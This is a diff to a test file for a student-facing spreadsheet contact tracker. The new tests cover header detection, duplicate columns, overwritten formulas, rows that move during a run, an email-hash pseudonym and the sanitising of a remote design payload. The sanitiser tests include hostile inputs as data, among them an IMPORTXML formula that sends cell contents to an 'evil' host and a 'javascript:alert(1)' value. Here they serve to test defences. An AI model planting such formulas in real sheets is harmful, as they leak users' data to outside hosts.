@@ -65,6 +65,11 @@ const EXPORTS = [
   // The look. Colour tables and widths are data, so they are testable — and a
   // typo in a hex paints a cell black on somebody's real sheet.
   'asSheetDate_', 'STATUS_STYLE', 'THEMES', 'CONTACTS_WIDTHS', 'FOUND_WIDTHS',
+  'duplicateBlotterHeadings_', 'formulasInBlotterColumns_', 'overwrittenFormulaWarnings_',
+  'rowsThatMoved_', 'accountHash_', 'sanitiseDesign_', 'safeColour_', 'safeNumber_',
+  'safeCell_', 'statusStyle_', 'columnWidth_', 'numberFormat_', 'SETTING_KEY',
+  'COURIER_VERSION', 'SCRIPT_URL',
+  'instructionRows_', 'expectedSetup_', 'SETTING_INSTALL_ID', 'SETTING_HELP',
   'COL_NAME', 'COL_TITLE', 'COL_FIRM', 'COL_EMAIL', 'COL_CLOSED',
   'BLOTTER_COLUMNS', 'FOUND_HEADERS',
   // Sorting: the two ranking functions are pure, and getting either subtly
@@ -713,6 +718,321 @@ eq('text is trimmed',
   eq('undefined becomes an empty cell', safe(undefined), '');
   // A minus inside a sentence is not a leading minus.
   eq('a dash mid-sentence is fine', safe('call cancelled - reschedule'), 'call cancelled - reschedule');
+}
+
+/* ------------------------------------------------------------------ *
+ * What a student can do to their sheet without breaking it.
+ *
+ * "Can I add a LinkedIn column?" is roughly the first thing a real student
+ * does, and nobody had ever established what survives it. These are the cases
+ * where the failure would otherwise be SILENT — a wrong answer on somebody
+ * else's line, or work destroyed with nothing said.
+ * ------------------------------------------------------------------ */
+
+const HEADERS = ['Name', 'Title', 'Firm', 'Email', 'Status', 'Days', 'Last contact',
+                 'Attempts', 'Next call', 'Last call', 'Closed'];
+
+function sheetWithHeaders(name, headerRowCells, extraRows = []) {
+  return fakeSheet(name, [['Blotter — all good.'], headerRowCells, ...extraRows]);
+}
+
+/* A single anchor word typed into the banner used to move the header row to 1,
+   and every answer after that lands one row off, silently, on another
+   person's line. The row with the MOST anchors wins now. */
+{
+  box.resetHeaderRowCache_();
+  const stray = fakeSheet('Contacts', [['Status'], HEADERS, ['Jamie']]);
+  eq('one stray anchor word in the banner does not move the header row',
+    box.headerRow_(stray), 2);
+
+  box.resetHeaderRowCache_();
+  const twoStray = fakeSheet('Contacts', [['Name', 'Email'], HEADERS, ['Jamie']]);
+  eq('even two stray words lose to a real header row of three',
+    box.headerRow_(twoStray), 2);
+
+  box.resetHeaderRowCache_();
+  const nothing = fakeSheet('Contacts', [['just some notes'], ['nothing here'], ['Jamie']]);
+  eq('a sheet with no recognisable headers falls back to row 1, the safe answer',
+    box.headerRow_(nothing), 1);
+}
+
+/* A student column called Status is the worst shape the sheet can take,
+   because findColumn_ takes the leftmost and Blotter overwrites it every
+   quarter of an hour without a word. */
+{
+  box.resetHeaderRowCache_();
+  eq('an ordinary sheet has no duplicate headings',
+    box.duplicateBlotterHeadings_(sheetWithHeaders('Contacts', HEADERS)), []);
+
+  box.resetHeaderRowCache_();
+  eq('a student column of their own is fine',
+    box.duplicateBlotterHeadings_(sheetWithHeaders('Contacts', HEADERS.concat(['LinkedIn', 'Notes']))), []);
+
+  box.resetHeaderRowCache_();
+  eq('two columns of their own with the same name are their business',
+    box.duplicateBlotterHeadings_(sheetWithHeaders('Contacts', HEADERS.concat(['Notes', 'Notes']))), []);
+
+  box.resetHeaderRowCache_();
+  eq('but a second column called Status is caught',
+    box.duplicateBlotterHeadings_(sheetWithHeaders('Contacts', ['Status'].concat(HEADERS))), ['"Status"']);
+
+  box.resetHeaderRowCache_();
+  eq('capitalisation does not hide it',
+    box.duplicateBlotterHeadings_(sheetWithHeaders('Contacts', HEADERS.concat(['days']))), ['"Days"']);
+
+  box.resetHeaderRowCache_();
+  eq('a duplicated Name is caught too — it is Blotter\'s join, not decoration',
+    box.duplicateBlotterHeadings_(sheetWithHeaders('Contacts', HEADERS.concat(['Name']))), ['"Name"']);
+
+  box.resetHeaderRowCache_();
+  // Reported in the order the duplicates are met scanning left to right, which
+  // is the order they appear on screen.
+  eq('two problems are both named',
+    box.duplicateBlotterHeadings_(sheetWithHeaders('Contacts', HEADERS.concat(['Days', 'Status']))),
+    ['"Days"', '"Status"']);
+}
+
+/* A formula in a Blotter column is replaced by a value on the next run, and
+   setValues says nothing about it. Blotter still writes — the column is its
+   own — but the student is told. */
+{
+  const formulaSheet = (grid) => ({
+    getSheetId: () => 9001,
+    getName: () => 'Contacts',
+    getMaxRows: () => grid.length + 2,
+    getLastColumn: () => HEADERS.length,
+    getRange: (row, col, numRows, numCols) => ({
+      getValues: () => [HEADERS],
+      getFormulas: () => grid.slice(0, numRows)
+        .map((r) => Array.from({ length: numCols }, (_, i) => r[i] ?? '')),
+    }),
+  });
+
+  box.resetHeaderRowCache_();
+  const clean = formulaSheet([['', '', '', '', '', '', '', '', '', '', '']]);
+  eq('no formulas, nothing reported', box.formulasInBlotterColumns_(clean, 3, 1), []);
+
+  box.resetHeaderRowCache_();
+  // Column 6 is Days.
+  const inDays = formulaSheet([['', '', '', '', '', '=TODAY()-C3', '', '', '', '', '']]);
+  eq('a formula in Days is found, with its row and column',
+    box.formulasInBlotterColumns_(inDays, 3, 1), [{ row: 3, column: 'Days' }]);
+
+  box.resetHeaderRowCache_();
+  // Column 2 is Title — the student's own. Blotter never touches it.
+  const inTheirs = formulaSheet([['', '=UPPER(A3)', '', '', '', '', '', '', '', '', '']]);
+  eq('a formula in a column of their own is left entirely alone',
+    box.formulasInBlotterColumns_(inTheirs, 3, 1), []);
+
+  eq('nothing to say when nothing was overwritten',
+    box.overwrittenFormulaWarnings_([]), []);
+  const warned = box.overwrittenFormulaWarnings_([{ row: 7, column: 'Days' }]);
+  eq('the warning names the row and the column', warned[0].includes('row 7 (Days)'), true);
+  eq('and says where a formula CAN live', warned[0].includes('column of your own'), true);
+  const many = box.overwrittenFormulaWarnings_(
+    Array.from({ length: 9 }, (_, i) => ({ row: i + 3, column: 'Days' })));
+  eq('a long list is capped and counted honestly', many[0].includes('and 4 more'), true);
+}
+
+/* A student dragging rows while a run is in flight. The menu sort takes the
+   script lock; a hand on the mouse does not, and the row number is the join
+   key — so a sort landing between the read and the write puts Jamie's status
+   on Alice's line, silently. Checked again immediately before writing. */
+{
+  const state = (namesNow, emailsNow) => ({
+    sheet: {
+      getRange: (row, col, height) => ({
+        getValues: () => (col === 1 ? namesNow : emailsNow)
+          .slice(0, height).map((v) => [v]),
+      }),
+    },
+    cols: { name: 1, email: 4 },
+    contacts: [
+      { row: 3, name: 'Jamie Diamond', emails: ['jamie@jpmorgan.com'] },
+      { row: 4, name: 'Alice Watts', emails: ['alice@ms.com'] },
+    ],
+  });
+
+  eq('nothing moved, nothing said',
+    box.rowsThatMoved_(state(['Jamie Diamond', 'Alice Watts'],
+                             ['jamie@jpmorgan.com', 'alice@ms.com']), 3, 4), []);
+
+  const swapped = box.rowsThatMoved_(
+    state(['Alice Watts', 'Jamie Diamond'], ['alice@ms.com', 'jamie@jpmorgan.com']), 3, 4);
+  eq('a swap is caught', swapped.length, 2);
+  eq('and it says who was where',
+    swapped[0].includes('row 3 was Jamie Diamond and is now Alice Watts'), true);
+
+  eq('an address changed under the run is caught too',
+    box.rowsThatMoved_(state(['Jamie Diamond', 'Alice Watts'],
+                             ['jamie@newfirm.com', 'alice@ms.com']), 3, 4).length, 1);
+
+  eq('a row emptied under the run is caught',
+    box.rowsThatMoved_(state(['', 'Alice Watts'], ['', 'alice@ms.com']), 3, 4).length, 1);
+
+  // Capitalisation and spacing in an address are not a move — matching has
+  // always ignored both, and stopping a run over one would be a false alarm.
+  eq('capitalisation alone is not a move',
+    box.rowsThatMoved_(state(['Jamie Diamond', 'Alice Watts'],
+                             ['Jamie@JPMorgan.com', 'alice@ms.com']), 3, 4), []);
+
+  eq('a long scramble is capped at three examples',
+    box.rowsThatMoved_(state(['x', 'y'], ['x@x.com', 'y@y.com']), 3, 4).length, 2);
+}
+
+/* The support handle and the way out, both of which have to be in the SHEET —
+   a student whose tracker has stopped is looking at the tracker. */
+{
+  const setup = box.expectedSetup_();
+  eq('the Blotter ID is a setting Step 1 creates',
+    setup.settings.includes(box.SETTING_INSTALL_ID), true);
+  eq('and so is Help', setup.settings.includes(box.SETTING_HELP), true);
+  eq('the ID row says it is for support', /quote this if you need help/i.test(box.SETTING_INSTALL_ID), true);
+
+  const rows = box.instructionRows_();
+  const text = rows.map((r) => `${r.a} ${r.b}`).join(' ');
+  eq('Start here says the student may add columns anywhere',
+    /add any columns you like, anywhere/i.test(text), true);
+  eq('and that formulas in their own columns are safe',
+    /put formulas in them/i.test(text), true);
+  eq('and which headings to leave alone', /Leave alone/i.test(text), true);
+  eq('and that a formula in a Blotter column will not survive',
+    /will not survive/i.test(text), true);
+  eq('and names Step 1 as the repair', /Step 1: Set up this sheet/i.test(text), true);
+  eq('and gives a way to reach a human', text.includes('jnachman17@gmail.com'), true);
+}
+
+/* ------------------------------------------------------------------ *
+ * The account pseudonym, and the hole that had to be closed first.
+ *
+ * Amendment A3: Session.getEffectiveUser().getEmail() really can come back
+ * empty. Hash that and every install in the same state shares one identity,
+ * and a single key unlocks all of them. Absence is a state; it must never
+ * become a value.
+ * ------------------------------------------------------------------ */
+{
+  global.Utilities.computeDigest = (_alg, text) => {
+    // A stand-in that is deterministic and collides for equal inputs, which is
+    // all these assertions need. The real digest is Google's.
+    let h = 0;
+    for (let i = 0; i < text.length; i++) h = (h * 31 + text.charCodeAt(i)) >>> 0;
+    return Array.from({ length: 32 }, (_, i) => ((h >>> (i % 4 * 8)) & 0xff) - 128);
+  };
+  global.Utilities.DigestAlgorithm = { SHA_256: 'SHA_256' };
+  global.Utilities.Charset = { UTF_8: 'UTF_8' };
+
+  const withEmail = (email) => {
+    global.Session = { getEffectiveUser: () => ({ getEmail: () => email }) };
+    return new Function('box', `${src}\nObject.assign(box, {accountHash_});`);
+  };
+  const hashFor = (email) => {
+    const b = {};
+    withEmail(email)(b);
+    return b.accountHash_();
+  };
+
+  eq('an empty address produces NO hash at all', hashFor(''), null);
+  eq('whitespace is still nothing', hashFor('   '), null);
+  eq('and so is an address Apps Script could not read', hashFor(null), null);
+  eq('a real address produces a hash', typeof hashFor('jon@utexas.edu'), 'string');
+  eq('the same person hashes the same twice',
+    hashFor('jon@utexas.edu'), hashFor('jon@utexas.edu'));
+  eq('capitalisation is not a different person',
+    hashFor('Jon@UTexas.edu'), hashFor('jon@utexas.edu'));
+  eq('two people are two identities',
+    hashFor('jon@utexas.edu') !== hashFor('someone@else.edu'), true);
+  eq('and an empty one is not quietly the same as a real one',
+    hashFor('') === hashFor('jon@utexas.edu'), false);
+}
+
+/* ------------------------------------------------------------------ *
+ * The design payload. A courier that renders what it is told can be told
+ * to write anything, so every value is checked rather than trusted.
+ * ------------------------------------------------------------------ */
+
+eq('a real colour passes', box.safeColour_('#1a73e8'), '#1a73e8');
+eq('three-digit shorthand does not', box.safeColour_('#abc'), null);
+eq('a colour name does not', box.safeColour_('red'), null);
+eq('nor does a formula wearing a colour’s clothes',
+  box.safeColour_('=IMPORTXML("http://x")'), null);
+eq('a bounded number passes', box.safeNumber_('120', 24, 600), 120);
+eq('one below the floor does not', box.safeNumber_(2, 24, 600), null);
+eq('one above the ceiling does not', box.safeNumber_(90000, 24, 600), null);
+eq('nonsense does not', box.safeNumber_('wide', 24, 600), null);
+
+{
+  const clean = box.sanitiseDesign_({
+    version: 'v1',
+    status_style: { Sent: { bg: '#dfe3e8', fg: '#3c4043' } },
+    widths: { contacts: { Name: 160 }, found: { Email: 200 } },
+    number_formats: { 'Last contact': 'm/d/yy' },
+    state_rank: { Sent: 20 },
+    instructions: [{ kind: 'h2', a: 'A heading' }],
+  });
+  eq('a well-formed payload survives intact', clean.status_style.Sent.bg, '#dfe3e8');
+  eq('and its widths', clean.widths.contacts.Name, 160);
+  eq('and its ranks', clean.state_rank.Sent, 20);
+  eq('and its rows', clean.instructions[0].a, 'A heading');
+}
+
+{
+  const dirty = box.sanitiseDesign_({
+    status_style: {
+      Sent: { bg: 'javascript:alert(1)', fg: '#000000' },   // not a colour
+      Nonsense: { bg: '#ffffff', fg: '#000000' },           // not a status
+    },
+    widths: { contacts: { Name: 99999, Sneaky: 100 } },     // out of range; unknown heading
+    state_rank: { Sent: 'first' },
+    instructions: [
+      { kind: 'h2', a: '=IMPORTXML("https://evil/"&A2)' },  // a live formula
+      { kind: 'script', a: 'something new' },               // a kind we cannot draw
+    ],
+  });
+  eq('a colour that is not a colour is dropped', dirty.status_style, undefined);
+  eq('a width out of range is dropped, and so is a heading Blotter does not own',
+    dirty.widths, undefined);
+  eq('a rank that is not a number is dropped', dirty.state_rank, undefined);
+  eq('a formula in copy is defused, not executed',
+    dirty.instructions[0].a.charAt(0), "'");
+  eq('and an unknown row kind is ignored rather than guessed at',
+    dirty.instructions.length, 1);
+}
+
+eq('a payload that is not an object at all', box.sanitiseDesign_('hello'), null);
+eq('nor null', box.sanitiseDesign_(null), null);
+
+/* The key field exists, empty and harmless, from today. */
+eq('there is somewhere for a key to go', box.SETTING_KEY, 'Blotter key');
+eq('and Step 1 creates it', box.expectedSetup_().settings.includes(box.SETTING_KEY), true);
+
+/* ------------------------------------------------------------------ *
+ * The served script must be the same bytes as this one.
+ *
+ * `/Code.gs` is what the update notice sends students to. A copy that drifts
+ * behind the repo would send them to an old script with nothing anywhere
+ * saying so — a silent wrong answer, which is the failure this project keeps
+ * choosing to make loud instead. `node courier/publish.js` fixes any drift.
+ * ------------------------------------------------------------------ */
+{
+  const crypto = require('node:crypto');
+  const servedPath = path.join(__dirname, '..', 'web', 'public', 'Code.gs');
+  const manifestPath = path.join(__dirname, '..', 'web', 'app', 'api', 'script', 'manifest.ts');
+
+  checks += 1;
+  if (!fs.existsSync(servedPath)) {
+    fails += 1;
+    console.error('FAIL web/public/Code.gs is missing — run: node courier/publish.js');
+  } else {
+    const served = fs.readFileSync(servedPath, 'utf8');
+    eq('the served script is byte-for-byte this one', served === src, true);
+
+    const sha = crypto.createHash('sha256').update(src).digest('hex');
+    const manifest = fs.readFileSync(manifestPath, 'utf8');
+    eq('the manifest records the right hash', manifest.includes(sha), true);
+    eq('and the right size', manifest.includes(String(Buffer.byteLength(src))), true);
+    eq('and the right version',
+      manifest.includes(JSON.stringify(box.COURIER_VERSION)), true);
+  }
 }
 
 console.log(fails === 0
